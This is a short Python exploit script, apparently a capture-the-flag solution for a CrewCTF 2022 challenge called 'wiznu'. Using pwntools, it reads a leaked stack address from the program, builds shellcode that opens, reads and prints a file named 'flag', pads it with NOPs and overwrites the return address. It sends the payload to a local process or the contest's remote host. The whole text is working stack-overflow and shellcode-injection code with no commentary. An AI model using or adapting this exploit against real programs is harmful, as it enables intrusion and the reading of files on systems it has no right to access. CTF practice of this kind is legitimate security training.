from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('wiznu.crewctf-2022.crewc.tf',1337)
    else:
        return process(e.path)

p = start()

def ret_leak():
    p.recvuntil(b"Special Gift for Special Person : ")
    leak = int(p.recvline(),16)
    return leak

def build_shellcode():
    FLAG_LEN = 40
    shellcode = asm(shellcraft.open(file='flag', oflag=0, mode=0))
    shellcode += asm(shellcraft.amd64.linux.read(fd='rax', buffer='rsp', count=FLAG_LEN))
    shellcode += asm(shellcraft.amd64.linux.write(constants.STDOUT_FILENO, 'rsp', FLAG_LEN))
    shellcode += asm(shellcraft.nop())*220    
    return shellcode

buf = build_shellcode()
buf += p64(ret_leak())

p.sendline(buf)
p.interactive()



